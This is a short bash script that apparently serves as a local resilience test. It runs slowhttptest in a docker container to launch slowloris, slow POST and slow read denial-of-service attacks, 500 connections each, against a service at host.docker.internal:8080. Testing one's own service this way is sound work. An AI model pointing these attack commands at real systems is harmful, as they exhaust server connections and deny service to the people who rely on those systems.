#!/bin/bash
set -e
MODE="${1:-slowloris}"
DURATION="${2:-1800}"

# Container çalışmıyorsa başlat (idempotent)
docker compose --profile attack up -d slowhttptest >/dev/null 2>&1

# Container hazır olana kadar küçük bir bekleme
sleep 2

case "$MODE" in
  slowloris)
    docker compose exec -T slowhttptest \
      slowhttptest -c 500 -H -i 10 -r 50 -t GET \
        -u http://host.docker.internal:8080/ \
        -x 24 -p 3 -l "$DURATION"
    ;;
  slow_post)
    docker compose exec -T slowhttptest \
      slowhttptest -c 500 -B -i 110 -r 50 -t POST \
        -u http://host.docker.internal:8080/auth/login \
        -x 60 -p 3 -l "$DURATION" \
    ;;
  slow_read)
    docker compose exec -T slowhttptest \
      slowhttptest -c 500 -X -r 50 \
        -u "http://host.docker.internal:8080/user/search?q=test" \
        -l "$DURATION"
    ;;
  *)
    echo "Unknown mode: $MODE"
    exit 1
    ;;
esac